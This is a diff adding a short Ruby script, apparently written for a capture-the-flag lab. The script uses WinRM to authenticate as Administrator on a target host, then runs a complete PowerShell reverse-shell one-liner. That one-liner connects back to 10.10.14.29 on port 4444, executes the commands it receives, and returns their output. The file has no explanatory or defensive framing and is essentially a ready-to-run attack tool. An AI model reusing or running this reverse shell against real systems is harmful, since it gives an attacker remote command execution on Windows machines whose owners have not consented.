@@ -1,0 +1,18 @@
+require 'winrm'
+
+opts = { 
+  endpoint: 'http://10.10.10.149:5985/wsman',
+  transport: :negotiate,
+  user: 'Administrator',
+  password: 'PASS'
+}
+
+conn = WinRM::Connection.new(opts)
+conn.shell(:powershell) do |shell|
+  output = shell.run('$client = New-Object System.Net.Sockets.TCPClient("10.10.14.29",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()') do |stdout, stderr|
+    STDOUT.print stdout
+    STDERR.print stderr
+  end
+  puts "The script exited with exit code #{output.exitcode}"
+end
+
